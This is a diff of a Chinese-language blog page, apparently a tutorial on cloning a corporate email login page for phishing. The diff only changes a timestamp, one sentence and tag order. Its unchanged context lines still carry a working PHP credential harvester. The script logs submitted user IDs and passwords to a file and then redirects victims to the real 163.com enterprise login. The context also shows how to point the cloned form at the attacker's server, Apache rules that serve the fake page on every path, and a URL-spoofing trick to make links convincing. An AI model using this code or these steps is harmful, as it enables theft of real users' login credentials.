@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="qingyu&#39;s blog">
 <meta property="og:description" content="0x0、让网站看起来一模一样寻找钓鱼目标网站安装克隆工具（kali自带，不用装）apt-get install httrack">
 <meta property="og:image" content="http://p2or7ktgu.bkt.clouddn.com/WX20180428-154441.png">
-<meta property="og:updated_time" content="2018-04-28T08:23:59.274Z">
+<meta property="og:updated_time" content="2018-04-28T08:28:27.162Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="愉快地进行网站钓鱼">
 <meta name="twitter:description" content="0x0、让网站看起来一模一样寻找钓鱼目标网站安装克隆工具（kali自带，不用装）apt-get install httrack">
@@ -211,7 +211,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = &quot;log.txt&quot;;   //在linux系统请确认这个文本有写入权限</span><br><span class="line">$password = $_POST[&apos;Password&apos;];</span><br><span class="line">$userid = $_POST[&apos;UserId&apos;];</span><br><span class="line">//file_put_contents($file, print_r($_POST, true), FILE_APPEND); 此为setooit的保存方法</span><br><span class="line">file_put_contents($file, $userid.&quot;   &gt;&gt;&gt;  &quot;.$password.&quot;\n&quot;, FILE_APPEND);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1; url=http://qiye.163.com/login/&quot; /&gt; </span><br><span class="line">&lt;!-- 跳回真正的登陆页面，一般用户不会留意这个跳转有问题，反正密码都获到了 --&gt;</span><br></pre></td></tr></table></figure>
 <p>修改克隆的html中的form表单：<br><code>&lt;form id=&quot;loginContent&quot; class=&quot;login_content&quot; action=&quot;http://172.16.17.86/post.php&quot; method=&quot;post&quot;&gt;</code></p>
 <p>把log.txt、post.php、index.html页面放到apache的/var/www/html中，开启apache服务，即可。</p>
-<h4 id="0x3、让链接看起来更像"><a href="#0x3、让链接看起来更像" class="headerlink" title="0x3、让链接看起来更像"></a>0x3、让链接看起来更像</h4><p>我们的服务器地址是 172.16.17.86，要是直接让受害者访问 <code>http://172.16.17.86/index.html</code>这种，迷惑性几乎为0，也很容易引起受害者的怀疑。所以必须让链接变成和真实域名差不多的样子。<br>&emsp;&emsp;这里有几种方法，购买域名、<a href="http://www.mingczh.com/newsinfo.aspx?NewsID=540" target="_blank" rel="noopener">自搭Dnsmasq</a> 、修改服务器的hosts共享wifi。<br>&emsp;&emsp;据实际考量，上述的几种方法都不是很适合本次的实验。<br>故另辟路径，结合浏览器的网址欺诈漏洞，可以生成诱惑性强的链接<br>1、 找到apache配置文件/etc/apache2/apache2.conf，增加两行记录：</p>
+<h4 id="0x3、让链接看起来更像"><a href="#0x3、让链接看起来更像" class="headerlink" title="0x3、让链接看起来更像"></a>0x3、让链接看起来更像</h4><p>我们的服务器地址是 172.16.17.86，要是直接让受害者访问 <code>http://172.16.17.86/index.html</code>这种，迷惑性几乎为0，也很容易引起受害者的怀疑。所以必须让链接变成和真实域名差不多的样子。<br>&emsp;&emsp;这里有几种方法，购买域名、<a href="http://www.mingczh.com/newsinfo.aspx?NewsID=540" target="_blank" rel="noopener">自搭Dnsmasq</a> 、修改服务器的hosts共享wifi。<br>&emsp;&emsp;据实际考量，上述的几种方法都不是很适合本次的实验，故另辟路径，结合浏览器的网址欺诈漏洞，可以生成诱惑性强的链接<br>1、 找到apache配置文件/etc/apache2/apache2.conf，增加两行记录：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AliasMatch ^/post.php /var/www/html/post.php</span><br><span class="line">AliasMatch ^/.* /var/www/html/index.html</span><br></pre></td></tr></table></figure>
 <p>然后重启apache</p>
 <blockquote>
@@ -520,6 +520,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">随记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">安全</a>
               </li>
              
@@ -532,15 +536,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">经验</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">dnslog</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">经验</a>
               </li>
             
             <div class="clearfix"></div>
